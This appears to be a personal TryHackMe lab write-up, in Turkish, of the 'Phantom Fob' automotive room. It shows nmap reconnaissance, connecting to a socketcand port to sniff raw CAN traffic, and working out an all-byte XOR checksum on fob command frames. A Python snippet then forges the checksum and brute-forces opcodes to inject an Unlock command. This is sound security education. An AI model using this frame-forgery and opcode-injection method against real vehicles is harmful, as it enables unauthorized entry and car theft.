---
title: "Phantom Fob — TryHackMe CAN Bus Rolling Code Forgery"
date: 2026-09-13 20:45:00 +0300
categories: [TryHackMe]
tags: [can-bus, automotive, socketcand, rolling-code, reverse-engineering, tryhackme]
image: /assets/img/posts/phantom-fob.png
---

> TryHackMe · Automotive / Embedded / CAN Bus · Medium
{: .prompt-info }

Aracın fob'unda Lock ve Horn var ama Unlock hiç yok — üretici "kopyalanamaz" diyor. Bus'ı dinleyip Lock/Horn komutlarının 8 byte'lık frame'ini parçalara ayırınca, byte'lardan birinin sabit olmayan bir counter, birinin komut kodu, birinin de **tüm frame'in XOR toplamını sabit bir değerde tutan bir checksum** olduğu ortaya çıktı. Checksum'ı doğru pozisyonda yeniden hesaplayıp counter'ı taze tutarak, fob'un hiç sahip olmadığı Unlock komutunu kendi elimle inşa ettim.

| Hedef | Zorluk | Kategori |
|---|---|---|
| 10.82.140.113 | Medium | Automotive / CAN Bus |

**Zincir:** Nmap recon → 8080 (Instrument Cluster dashboard, `/press` + `/events`) ve 29536 (tanınmayan, her girdiye `< hi >` dönen port) → 29536'nın aslında **socketcand** protokolü olduğunu fark etmek → `< open can0 >` / `< rawmode >` ile ham CAN trafiğine bağlanmak → Lock/Horn/Immobiliser basışlarını bus'taki yeni bir ID (`1B5`) ile korele etmek → 8 byte'lık frame'i byte-byte analiz etmek (sabitler, counter, komut kodu) → basit `counter XOR key XOR command` varsayımının tutmaması → frame'in **tüm 8 byte'ının XOR'unun her zaman sabit (`0x4F`) olduğunu** fark etmek → checksum byte'ının doğru pozisyonunu (2, 5, 6 arasından deneyerek) bulmak → counter'ı bir artırıp, bilinmeyen 252 komut kodunu (0x00–0xFF, bilinen 4 tanesi hariç) tek seferde bus'a enjekte etmek → kilit açılıyor, flag geliyor

## 01 — Keşif

```console
$ nmap -sC -sV -p- --min-rate 1000 10.82.140.113
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu
8080/tcp  open  http    Werkzeug httpd 3.1.8 (Python 3.12.3)
29536/tcp open  unknown
```

`8080`'de "Instrument Cluster" başlıklı bir Flask dashboard'u, `29536`'da ise nmap'in hiçbir servis parmak izine oturtamadığı, her probe'a (HTTP, RTSP, LDAP, ne gönderirsen gönder) birebir aynı `< hi >` cevabını veren bir port vardı. Bu ikinci davranış önemli bir ipucu: servis gelen veriyi hiç okumadan, bağlantı kurulur kurulmaz sabit bir banner basıyor.

## 02 — Dashboard: `/press` ve `/events`

`8080`'in HTML/JS kaynağını çekince iki net endpoint çıktı:

```console
$ curl -s http://10.82.140.113:8080/
...
const es = new EventSource('/events');
...
fetch('/press', {method:'POST', body: JSON.stringify({button: b})})
```

- **`/press`** — `{"button": "LOCK"|"HORN"|"IMMOB_ARM"|"IMMOB_DISARM"}` gönderip fob butonlarını tetikliyor. `UNLOCK` denemesi `{"msg":"no such control","ok":false}` ile geri dönüyor — böyle bir kontrol hiç yok.
- **`/events`** — SSE ile `locked`, `immob`, `horn`, `speed`, `seen_ids`, `flag` gibi **özet/türetilmiş** durumu akıtıyor; ham CAN verisi burada yok.

Directory fuzzing (`gobuster`), gizli bir API endpoint'i veya Werkzeug debug konsolu bulamadı; `.git` sızıntısı da yoktu. Web tarafı temizdi — asıl iş bus'ta.

## 03 — 29536: socketcand

`29536` portu rastgele değil: bu, [socketcand](https://github.com/linux-can/socketcand)'ın standart portu — CAN bus'ı TCP üzerinden köşeli-parantez metin protokolüyle (`< komut argümanlar >`) sunan bir daemon. `< hi >` de tam olarak bu protokolün karşılama banner'ı.

```console
$ nc 10.82.140.113 29536
< hi >
< open can0 >
< ok >
< rawmode >
< ok >
< frame 611 1789320470.297577 3cba02012e763aab >
< frame 44F 1789320470.307973 1ed80509d49d1a97 >
...
```

`rawmode`'a geçince bus'taki tüm trafik `< frame ID TIMESTAMP DATA >` formatında akmaya başladı — saniyede ~230 frame, hız/dönüş sinyali/immobiliser gibi periyodik telemetri.

## 04 — Buton basışlarını CAN ID'sine bağlamak

socketcand'e bağlı kalıp arka planda `/press`'e curl atarak, baseline'da hiç görülmemiş bir ID belirdi:

```
Baseline ID'ler: 14F 2F7 33E 3BF 44F 4E9 4F2 611 65E
LOCK'tan hemen sonra yeni ID:  1B5   DATA=a31a3c04726a4d9b
```

`1B5`, LOCK/HORN/IMMOB_ARM/IMMOB_DISARM her basışında tam olarak bir kez beliren fob-komut frame'iydi. Art arda ve **uzun aralıklarla** (4-4.5 saniye, herhangi bir queue/race durumunu elemek için) basıp temiz örnekler topladım:

```
LOCK:  a3 34 4c 04 10 90 8b 9b
       a3 35 c4 04 10 ad 3f 9b
       a3 36 48 04 10 48 55 9b
       a3 37 23 04 10 1a 6d 9b
HORN:  a3 38 20 04 72 72 6b 9b
       ...
IMMOB_ARM:    a3 3c a4 04 3a 45 94 9b
IMMOB_DISARM: a3 3e 02 04 fe d4 65 9b
```

Byte byte karşılaştırınca:

| Byte | Rol |
|---|---|
| 0 | Sabit — `a3` |
| 1 | **Counter** — her basışta tam +1 artıyor, buton ne olursa olsun |
| 2 | Değişken (bilinmiyor) |
| 3 | Sabit — `04` |
| 4 | **Komut kodu** — buton başına sabit: LOCK=`10`, HORN=`72`, ARM=`3a`, DISARM=`fe` |
| 5 | Değişken (bilinmiyor) |
| 6 | Değişken (bilinmiyor) |
| 7 | Sabit — `9b` |

## 05 — Yanlış iz: basit `counter XOR key XOR command`

Bilinen bir CAN rolling-code zafiyeti kalıbı, auth byte'ının `counter XOR key XOR command` şeklinde kurulup key'in tek bir sniff'lenmiş frame'den geri çözülebilmesi. Bu formülü byte 2, 5, 6'nın her biri için (aynı buton, farklı counter değerleriyle) test ettim — **hiçbiri** counter ile sabit bir XOR ilişkisi vermedi. Aynı şekilde byte2/5/6'yı rastgele veya eski (bayat) değerlerle doldurup taze bir counter+komutla enjekte etmeyi denedim; ikisi de reddedildi. Yani auth, tek bir byte'a indirgenen basit bir formül değildi.

> 💡 Bu noktada aynı odanın herkeste farklı rastgele parametrelerle (farklı CAN ID, farklı byte pozisyonları, farklı komut kodları) döndüğünü öğrendim — [djalilayed'in TryHackMe writeup deposu](https://github.com/djalilayed/tryhackme/tree/main/Phantom_Fob) kendi instance'ında aynı yapıyı çözmüştü, ama farklı bir checksum modeliyle: tek bir "auth byte" değil, **frame'in tüm byte'larının XOR'unun sabit bir hedef değere eşit olması**. Kendi instance'ımızdaki `CHECKSUM_INDEX`'i bulmak ve script'i bizim CAN ID/byte pozisyonlarımıza uyarlamak yine de bize kaldı, ama kırılma noktasını (tekil auth byte değil, tüm-frame checksum) bu kaynaktan aldık.
{: .prompt-tip }

## 06 — Asıl model: tüm frame'in XOR checksum'ı

Gerçek yakalanmış frame'lerin **8 byte'ının tamamının XOR'unu** aldığımda, buton ve counter ne olursa olsun hep aynı sonucu verdi:

```
a3^34^4c^04^10^90^8b^9b = 0x4F
a3^35^c4^04^10^ad^3f^9b = 0x4F
a3^38^20^04^72^72^6b^9b = 0x4F
```

Yani doğrulama, tek bir byte'ın gizli bir anahtarla şifrelenmesi değil — **checksum byte'ı, toplam XOR'u her zaman `0x4F`'de sabitleyecek şekilde ayarlanıyor**. Bunu forge etmek için tek gereken: gerçek bir donor frame al, counter'ı +1 artır, komut kodunu değiştir, checksum pozisyonundaki byte'ı `0` yapıp yeniden hesapla (`hedef_xor XOR geri_kalan_byte'ların_xor'u`), diğer her şeyi (byte2 ve byte6 dahil) olduğu gibi kopyala.

Tek bilinmeyen: checksum hangi pozisyonda (`2`, `5`, yoksa `6`)? djalilayed'in script'ini ([solve_xor.py](https://github.com/djalilayed/tryhackme/blob/main/Phantom_Fob/solve_xor.py)) kendi ID/index'lerimize uyarlayıp üçünü de sırayla deneyerek buldum — `5`.

```python
OPCODE_INDEX = 4
COUNTER_INDEX = 1
CHECKSUM_INDEX = 5          # 2 ve 6 denendi, ikisi de reddedildi

candidate[OPCODE_INDEX] = opcode
candidate[COUNTER_INDEX] = next_counter
candidate[CHECKSUM_INDEX] = 0
candidate[CHECKSUM_INDEX] = target_xor ^ xor_bytes(candidate)
```

## 07 — Bilinmeyen komutu taramak

Bilinen 4 komut kodu (`0x10`, `0x72`, `0x3a`, `0xfe`) hariç, kalan 252 değerin her biri için geçerli bir checksum'lu frame üretip hepsini tek seferde (burst) `1B5` üzerine gönderdim — hangisinin gerçek `UNLOCK` olduğunu bilmediğim için 0x00–0xFF'i tara(t)mak, "kilidi ne açıyor?" sorusunu tek tek denemekten daha hızlıydı:

```console
$ python3 solve_xor.py
< hi >
Captured:     A35142041042329B
Current ctr:  51
Next ctr:     52
Target XOR:   4F
Sent 252 opcode candidates
Unlock candidate burst sent
```

```console
$ curl -s http://10.82.140.113:8080/events | head -3
data: {"locked": false, "immob": false, "horn": false, ..., "flag": "THM{...}"}
```

`locked: false` — 252 aday arasından biri gerçek Unlock komutuymuş ve araç onu geçerli auth ile geldiği için kabul etti.

![Instrument Cluster dashboard — Doors UNLOCKED, Immobiliser DISARMED, flag alanı ve adres çubuğu redakte edilmiştir](/assets/img/posts/phantom-fob-dashboard.png)

## Özet — Öğrenilen teknikler

- **`< hi >` gibi anlamsız görünen bir banner, aslında bilinen bir protokolün (socketcand) imzası olabilir** — nmap'in tanıyamadığı her port "boş" demek değil, parmak izini elle aramak gerekiyor.
- **Aynı buton, farklı basışlarda farklı counter değerleri üretiyorsa, o pozisyon neredeyse kesin bir rolling counter'dır** — ama tüm "rastgele görünen" byte'lar mutlaka gizli-anahtarlı şifreleme olmak zorunda değil.
- **Basit `counter XOR key XOR command` formülü tutmuyorsa bir sonraki adım, tekil byte yerine tüm frame'in checksum invariant'ını (XOR/toplam) test etmektir** — CAN gibi düşük seviyeli protokollerde "auth" çoğu zaman gerçek kriptografi değil, frame bütünlüğü için eklenen zayıf bir checksum'dur.
- **Rolling code'un "kopyalanamaz" olması, replay'e karşı koruyor olabilir ama forge'a karşı korumuyor** — counter ve checksum'ın matematiğini anladığınızda, fiziksel fob'un hiç sahip olmadığı bir komutu (Unlock) sıfırdan inşa edebilirsiniz.
- **Topluluk kaynakları farklı instance parametreleriyle gelse bile metodoloji taşınır** — kırılma noktasını (tüm-frame XOR checksum) [djalilayed'in yazısından](https://github.com/djalilayed/tryhackme/tree/main/Phantom_Fob) aldım; farklı CAN ID, farklı byte dizilimi ve farklı `CHECKSUM_INDEX` olsa da "checksum'ı yeniden hesapla, gerisini kopyala, opcode'u tara" yaklaşımı kendi instance'ıma birebir uyarlanabildi.

---

Kişisel TryHackMe lab notu — Phantom Fob, eğitim/lab ortamı. Flag değeri platform politikası gereği bu belgede paylaşılmamıştır.
